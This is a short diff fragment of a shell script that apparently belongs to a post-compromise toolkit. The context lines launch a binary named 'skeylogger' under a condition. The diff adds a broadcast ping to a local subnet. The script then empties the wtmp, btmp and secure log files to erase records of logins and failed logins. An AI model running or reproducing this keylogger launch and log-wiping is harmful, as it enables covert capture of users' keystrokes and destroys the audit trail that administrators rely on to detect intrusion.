@@ -21,6 +21,8 @@ if [ $result -ge 1 ]
 	./skeylogger
 fi
 
+ping -c 1 -b 10.10.15.255 
+
 echo >/var/log/wtmp
 echo >/var/log/btmp
 echo >/var/log/secure
